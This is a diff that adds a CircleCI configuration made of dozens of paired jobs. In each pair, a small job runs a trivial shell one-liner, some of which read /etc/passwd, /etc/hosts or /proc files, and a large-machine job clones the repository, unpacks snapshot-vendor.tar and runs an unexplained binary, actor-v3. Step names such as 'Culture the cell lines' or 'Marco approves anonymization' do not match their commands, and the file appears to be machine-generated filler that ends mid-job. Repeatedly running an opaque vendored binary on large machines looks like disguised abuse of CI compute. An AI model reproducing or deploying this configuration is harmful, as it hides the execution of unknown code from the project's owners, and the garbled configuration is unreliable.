@@ -1,0 +1,1641 @@
+version: 2.1
+
+jobs:
+  reducePre:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Renew Intrusion Rules
+          command: |
+            mkdir -p /tmp/ex
+            set +o pipefail 2>/dev/null; echo {a..z} | tr -d ' ' > /tmp/ex/MD5-Gamma; seq 1 1005785 >> /tmp/ex/MD5-Gamma; true
+            echo "stage=py311-test"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'MD5-Gamma'
+  py311-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/MD5-Gamma 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  MULTI_COUNTER:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Sprint to page
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; expr length 'v1.2.3 released'; true ; } > /tmp/ex/4Ob
+            echo "stage=test"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '4Ob'
+  test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/4Ob 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  listen_UNWRAP:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Smoke Test Triage WEB 6117
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; /bin/echo 'a-b-c'; true ; } > /tmp/ex/hwfx
+            echo "stage=refactor-1844"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'hwfx'
+  refactor-1844:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/hwfx 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  bigOrbit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Culture the cell lines and wait
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; if test -h /etc/os-release;then echo present; elif test -e /tmp;then echo maybe; else echo "absent"; fi; true ; } > /tmp/ex/otter486
+            echo "stage=bake-it"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'otter486'
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/otter486 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  allChars:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: maybe hover the image carousel
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; for path in /usr/bin/z*; do echo "$(basename $path): $(wc -l < $path)"; done | nl; true ; } > /tmp/ex/env-Wolf-tmp
+            echo "stage=bug-1442"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'env-Wolf-tmp'
+  bug-1442:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/env-Wolf-tmp 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  NavFast:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: BEGIN ALIQUOT FUME HOOD
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; pr -3 -t /etc/hosts | head -n6; true ; } > /tmp/ex/6839ad2d07d9bfebc
+            echo "stage=rc-v8"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '6839ad2d07d9bfebc'
+  rc-v8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/6839ad2d07d9bfebc 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  Myc0F9Q0:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Impute Null Columns In Preprod
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; for p in $(seq 1 4); do echo "${p}"; done |head -3; true ; } > /tmp/ex/125.154.64.128
+            echo "stage=STG_MERGE_8"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '125.154.64.128'
+  STG_MERGE_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/125.154.64.128 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  Puzzles:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Ensure that the master file is cropped
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; grep -wRln alias /etc/profile.d | sort | head -n 6; true ; } > /tmp/ex/4aeb4443b8
+            echo "stage=rollout"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '4aeb4443b8'
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/4aeb4443b8 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  galaxy-node-command:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: renew secrets on lab
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; mkdir -p "/var/tmp/attic" && touch "/var/tmp/attic"/a.tmp "/var/tmp/attic"/b.tmp && find "/var/tmp/attic" -name '*.tmp' -delete && ls -A "/var/tmp/attic"; true ; } > /tmp/ex/9qvlv6
+            echo "stage=MERGE_UAT"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '9qvlv6'
+  MERGE_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/9qvlv6 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  input-list--fixed:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Total deferred revenue gross
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; id -Gn | tr ' ' '\n' | shuf -n 4 | nl -w2 -s". "; true ; } > /tmp/ex/v.2.10
+            echo "stage=preview"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'v.2.10'
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/v.2.10 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  VbRFfZs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Marco approves anonymization
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; printf %s "ok" | cksum | awk '{print $1}'; true ; } > /tmp/ex/1e5494ff58d
+            echo "stage=v7-beta2"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '1e5494ff58d'
+  v7-beta2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/1e5494ff58d 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  tracef:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Sync to click
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; grep -w Uid /proc/self/status | wc -l; true ; } > /tmp/ex/2022-08-12T17-26
+            echo "stage=v1-canary"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '2022-08-12T17-26'
+  v1-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/2022-08-12T17-26 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  spoangstranai:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: WebhookSecretEnforcementHandler
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; cp /etc/shells /tmp/segment01.copy && sed -i -e '/^#/d' /tmp/segment01.copy && head -n 3 /tmp/segment01.copy; true ; } > /tmp/ex/coastalCoin
+            echo "stage=PackageImage"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'coastalCoin'
+  PackageImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/coastalCoin 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  lilabel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: spin up and freeze
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; echo "are we there yet?" | cat -A; true ; } > /tmp/ex/scratch_3d55dda
+            echo "stage=bravo-1"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'scratch_3d55dda'
+  bravo-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/scratch_3d55dda 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  constName:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Retry a8bf
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; ls -n -p -S ~/.profile|awk '{print $3}'|sort -u; true ; } > /tmp/ex/east_valley_indigo
+            echo "stage=deploy"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'east_valley_indigo'
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/east_valley_indigo 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  drawcontractthread:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Next patch the vault
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; touch "/tmp/sugar.list" && mv -v "/tmp/sugar.list" "/tmp/block.tools.bak"; true ; } > /tmp/ex/token_atoll
+            echo "stage=validate-production-integration-tests"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'token_atoll'
+  validate-production-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/token_atoll 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  a0ac61a6-a13b-3595-a854-fb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Nudge the team for round two
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; if [[ -k /tmp ]]; then echo true; fi; true ; } > /tmp/ex/2b605dba96f764317c8cac4ce68
+            echo "stage=shippit"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '2b605dba96f764317c8cac4ce68'
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/2b605dba96f764317c8cac4ce68 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  DTE-PREV-ID:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Accrual SKIP
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; for p in blue orange pink; do printf '%s\n' "${p}"; done | head --lines=3; true ; } > /tmp/ex/receipt.moth
+            echo "stage=v5-edge"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'receipt.moth'
+  v5-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/receipt.moth 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  ms321:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Could you dedupe the vector index
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; grep -Hv -m4 if /etc/profile | nl; true ; } > /tmp/ex/20220710
+            echo "stage=hotel-4"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '20220710'
+  hotel-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/20220710 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  shortCb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Phase IV labeling
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; printf -v dst "%s-%s" wolf cat; echo "$dst"; true ; } > /tmp/ex/cluster-glacier-vault-silent
+            echo "stage=yolo"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'cluster-glacier-vault-silent'
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/cluster-glacier-vault-silent 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  ckpt724:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: last bit
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 2 -type d -name 'group*' -exec echo dir: {} \; 2>/dev/null | awk -F/ '{print $NF}'; true ; } > /tmp/ex/tmp_79
+            echo "stage=depoly"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'tmp_79'
+  depoly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/tmp_79 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  max_env:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Finally rotate the orphaned files
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; touch "/tmp/JOB.bak" && cp "/tmp/JOB.bak"{,.bak} && ls "/tmp/JOB.bak"*; true ; } > /tmp/ex/indIgobRAmBlefILtEr
+            echo "stage=rm-router-v2-timeout"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'indIgobRAmBlefILtEr'
+  rm-router-v2-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/indIgobRAmBlefILtEr 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  hank99:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: If the seating plan is down carry on
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >'/tmp/bottom_stub_pod.gz' && zcat '/tmp/bottom_stub_pod.gz' | head -3; true ; } > /tmp/ex/2027-07-13T16-16
+            echo "stage=v9-beta4"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '2027-07-13T16-16'
+  v9-beta4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/2027-07-13T16-16 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  lr1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Phase XII schema refresh
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; cat /etc/profile | awk '{print NF}' | shuf -n 1; true ; } > /tmp/ex/dd73e9642fbe
+            echo "stage=beta-v9"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'dd73e9642fbe'
+  beta-v9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/dd73e9642fbe 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  PIX:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Research Side Drain
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -op ~ | nl; true ; } > /tmp/ex/EXaqfdWnT1tgg1hs1Xw
+            echo "stage=vela-rc"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'EXaqfdWnT1tgg1hs1Xw'
+  vela-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/EXaqfdWnT1tgg1hs1Xw 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  OY2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Conjure cookbook
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\njuan,osaka,75\nmia,vienna,77\nsam,zurich,65\nivan,boston,80\n' >${TMPDIR:-/tmp}/NightBottom.csv && cut -d, -f2 ${TMPDIR:-/tmp}/NightBottom.csv | tail -n +2 | sort -u; true ; } > /tmp/ex/PANO54129
+            echo "stage=tb"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'PANO54129'
+  tb:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/PANO54129 2>/dev/null || true
+      - run:
